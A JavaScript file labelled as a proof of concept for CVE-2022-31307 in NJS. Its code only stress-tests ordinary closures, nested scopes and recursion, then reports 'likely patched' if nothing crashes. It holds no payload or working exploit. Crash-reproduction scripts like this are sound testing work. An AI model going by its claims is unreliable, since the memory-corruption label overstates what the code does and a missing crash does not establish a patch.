// CVE-2022-31307 Proof of Concept
// Target: NJS versions with closure and scope vulnerabilities
// Type: Scope chain manipulation and closure memory corruption

function main() {
    console.log("Starting CVE-2022-31307 reproduction...");
    
    try {
        // Create complex closure scenarios
        console.log("Testing closure scope manipulation...");
        
        function outerFunction(param) {
            let outerVar = param;
            const closures = [];
            
            // Create many closures with shared scope
            for (let i = 0; i < 1000; i++) {
                closures.push((function(index) {
                    let innerVar = index;
                    
                    return function() {
                        // Access variables from multiple scopes
                        return outerVar + innerVar + index;
                    };
                })(i));
            }
            
            return closures;
        }
        
        // Create nested closures
        const closureArray = outerFunction("test");
        
        // Execute all closures
        console.log("Executing closures...");
        const results = [];
        for (let i = 0; i < closureArray.length; i++) {
            results.push(closureArray[i]());
        }
        
        // Deeply nested scope chain
        console.log("Testing deeply nested scopes...");
        function createNestedScope(depth) {
            if (depth <= 0) {
                return function() { return "base_scope"; };
            }
            
            let scopeVar = `scope_${depth}`;
            return function() {
                const nested = createNestedScope(depth - 1);
                return scopeVar + "_" + nested();
            };
        }
        
        const deepScope = createNestedScope(100);
        const deepResult = deepScope();
        
        // Variable capture in loops
        console.log("Testing variable capture scenarios...");
        const capturedFunctions = [];
        
        for (var loopVar = 0; loopVar < 1000; loopVar++) {
            capturedFunctions.push((function(captured) {
                return function() {
                    return captured * 2;
                };
            })(loopVar));
        }
        
        // Execute captured functions
        const capturedResults = [];
        for (let i = 0; i < capturedFunctions.length; i++) {
            capturedResults.push(capturedFunctions[i]());
        }
        
        // Complex closure with multiple references
        console.log("Testing complex closure references...");
        function complexClosureFactory() {
            const sharedData = { value: 0 };
            const functions = [];
            
            for (let i = 0; i < 500; i++) {
                functions.push(function(multiplier) {
                    return function() {
                        sharedData.value += multiplier || 1;
                        return sharedData.value;
                    };
                }(i));
            }
            
            return functions;
        }
        
        const complexClosures = complexClosureFactory();
        
        // Execute complex closures
        const complexResults = [];
        for (let i = 0; i < complexClosures.length; i++) {
            complexResults.push(complexClosures[i]());
        }
        
        // Recursive closures
        console.log("Testing recursive closures...");
        function recursiveClosureFactory(n) {
            if (n <= 0) return function() { return 0; };
            
            const innerFunction = recursiveClosureFactory(n - 1);
            return function() {
                return n + innerFunction();
            };
        }
        
        const recursiveClosure = recursiveClosureFactory(100);
        const recursiveResult = recursiveClosure();
        
        console.log("CVE-2022-31307: Closure and scope operations completed");
        console.log("Closure results count:", results.length);
        console.log("Deep scope result length:", deepResult.length);
        console.log("Captured results count:", capturedResults.length);
        console.log("Complex results count:", complexResults.length);
        console.log("Recursive result:", recursiveResult);
        console.log("No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();